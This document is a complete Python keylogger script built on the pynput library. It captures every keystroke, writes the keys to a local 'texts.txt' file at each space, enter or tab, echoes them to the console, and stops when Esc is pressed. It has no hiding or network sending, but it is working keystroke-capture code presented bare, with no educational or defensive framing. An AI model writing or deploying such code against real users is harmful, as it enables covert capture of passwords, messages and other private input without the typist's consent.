from pynput.keyboard import Key, Listener

k_list = []  # key lists


def on_press(key):
    if key != Key.space and key != Key.enter and key != Key.tab:
        k_list.append(key)
    if key == Key.space:
        k_list.append('-/space\n')
        print(k_list)
        write_txtfile(k_list)
        k_list.clear()
    if key == Key.enter:
        k_list.append(" => (enter)\n")
        print(k_list)
        write_txtfile(k_list)
        k_list.clear()
    if key == Key.tab:
        k_list.append('--/newtab\n')
        print(k_list)
        write_txtfile(k_list)
        k_list.clear()


def on_release(key):
    if key == Key.esc:
        print('exit')
        return False


def write_txtfile(k_list):
    with open("texts.txt", "a", encoding="utf-8") as file:
        for key in k_list:
            k = str(key).replace("'", "")
            file.write(k)  # write the word in txtfile


with Listener(on_press=on_press, on_release=on_release) as listener: listener.join()
